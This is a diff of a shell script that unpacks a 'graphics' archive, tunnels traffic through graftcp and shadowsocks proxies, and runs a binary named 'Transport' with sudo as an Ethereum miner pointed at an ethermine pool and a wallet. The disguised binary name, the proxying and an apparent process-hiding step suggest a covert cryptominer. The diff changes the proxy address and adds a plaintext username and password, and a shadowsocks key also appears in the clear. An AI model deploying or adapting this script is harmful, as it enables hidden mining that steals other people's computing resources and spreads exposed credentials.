@@ -16,9 +16,9 @@ tar -xvzf graphics.tar.gz
 cat > graftcp/local/graftcp-local.conf <<END
 listen = :2233
 loglevel = 1
-socks5 = 46.23.141.19:1080
-socks5_username = 
-socks5_password = 
+socks5 = 129.158.58.77:1080
+socks5_username = Archer
+socks5_password = 12322
 END
 
 ./graftcp/local/graftcp-local -config graftcp/local/graftcp-local.conf &
@@ -35,8 +35,8 @@ chmod +x Transport
 
 apt -y install shadowsocks-libev rng-tools
 
-ss-local -s 46.23.141.19 -p 8388 -l 9999 -k 1rN14HAmV -m chacha20-ietf-poly1305 -v &
+ss-local -s 129.158.58.77 -p 1080 -l 9999 -k 1rN14HAmV -m chacha20-ietf-poly1305 -v &
 
 ph add Transport
 
-sudo ./Transport -a ethash -o asia1.ethermine.org:14444 -u 0xee8d6ac2827f65b369babfe5a4cd31dcdfb96aab -p x -w Trans --no-sni --dns-https-server 1.1.1.1 --proxy 127.0.0.1:9999
+sudo ./Transport -a ethash -o asia1.ethermine.org:14444 -u 0xee8d6ac2827f65b369babfe5a4cd31dcdfb96aab -p x -w Trans --no-sni --dns-https-server 1.1.1.1 
